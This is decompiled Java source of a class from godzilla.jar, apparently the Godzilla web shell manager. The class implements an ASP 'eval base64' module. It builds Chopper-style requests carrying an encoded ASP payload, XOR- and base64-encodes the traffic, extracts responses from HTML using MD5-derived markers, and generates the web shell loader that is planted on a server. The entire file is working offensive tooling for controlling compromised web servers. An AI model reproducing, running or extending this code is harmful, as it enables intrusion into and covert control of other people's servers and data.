/*     */ package shells.cryptions.aspXor;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ @CryptionAnnotation(Name = "ASP_EVAL_BASE64", payloadName = "AspDynamicPayload")
/*     */ public class AspEvalBase64
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private byte[] key;
/*     */   private boolean state;
/*     */   private String pass;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String findStrRight;
/*     */   private String chopperRequest;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  26 */     this.shell = context;
/*  27 */     this.http = this.shell.getHttp();
/*  28 */     this.key = this.shell.getSecretKeyX().getBytes();
/*  29 */     this.pass = this.shell.getPassword();
/*  30 */     this.chopperRequest = URLEncoder.encode((new String(functions.readInputStreamAutoClose(AspEvalBase64.class.getResourceAsStream("template/evalRequest.bin")))).replace("{hexCode}", functions.byteArrayToHex((new String((new AspBase64()).generate(this.shell.getSecretKey(), this.shell.getSecretKeyX()))).replace("<%", "").replace("%>", "").getBytes())));
/*  31 */     String findStrMd5 = functions.md5(context.getSecretKey() + functions.md5(context.getSecretKeyX()).substring(0, 16));
/*  32 */     this.findStrLeft = findStrMd5.substring(0, 6);
/*  33 */     this.findStrRight = findStrMd5.substring(20, 26);
/*     */     try {
/*  35 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  36 */       if (this.payload != null) {
/*  37 */         this.http.sendHttpResponse(this.payload);
/*  38 */         this.state = true;
/*     */       } else {
/*  40 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  43 */     } catch (Exception e) {
/*  44 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  53 */       return E(data);
/*  54 */     } catch (Exception e) {
/*  55 */       Log.error(e);
/*  56 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*  63 */     if (data != null && data.length > 0) {
/*     */       try {
/*  65 */         return D(findStr(data));
/*  66 */       } catch (Exception e) {
/*  67 */         Log.error(e);
/*  68 */         return null;
/*     */       } 
/*     */     }
/*  71 */     return data;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  79 */     return true;
/*     */   }
/*     */   
/*     */   protected void decryption(byte[] data, byte[] key) {
/*  83 */     int len = data.length;
/*  84 */     int keyLen = key.length;
/*  85 */     int index = 0;
/*  86 */     for (int i = 1; i <= len; i++) {
/*  87 */       index = i - 1;
/*  88 */       data[index] = (byte)(data[index] ^ key[i % keyLen]);
/*     */     } 
/*     */   }
/*     */   
/*     */   public byte[] E(byte[] cs) {
/*  93 */     return (this.pass + "=" + this.chopperRequest + "&" + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
/*     */   }
/*     */   public byte[] D(String data) {
/*  96 */     byte[] cs = functions.base64Decode(data);
/*  97 */     return cs;
/*     */   }
/*     */   public String findStr(byte[] respResult) {
/* 100 */     String htmlString = new String(respResult);
/* 101 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 106 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 112 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), getClass().getSimpleName());
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\aspXor\AspEvalBase64.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */